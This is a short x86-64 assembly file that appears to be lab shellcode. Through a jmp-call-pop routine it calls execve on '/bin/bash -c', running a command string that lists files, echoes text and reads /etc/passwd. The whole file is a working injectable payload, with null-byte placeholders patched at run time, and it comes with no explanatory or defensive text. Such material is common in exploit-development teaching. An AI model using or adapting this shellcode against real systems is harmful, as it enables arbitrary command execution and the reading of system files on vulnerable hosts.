ARGV equ 72

section .text
  global _start
    _start:
      BITS 64
      jmp short two
    one:
      pop rbx

      xor rax, rax
      mov [rbx+9], al
      mov [rbx+12], al
      mov [rbx+ARGV-1], al

      mov [rbx+ARGV], rbx
      lea rcx, [rbx+10]
      mov [rbx+ARGV+8], rcx
      lea rcx, [rbx+13]
      mov [rbx+ARGV+16], rcx
      mov [rbx+ARGV+24], rax

      mov rdi, rbx
      lea rsi, [rbx+ARGV]
      xor rdx, rdx
      xor rax, rax
      mov al, 0x3b
      syscall
    two:
      call one
      db '/bin/bash*'
      db '-c*'
      db '/bin/ls -l; echo Hello 64; /bin/tail -n 4 /etc/passwd     *'
      db 'AAAAAAAA'
      db 'AAAAAAAA'
      db 'AAAAAAAA'
      db 'AAAAAAAA'

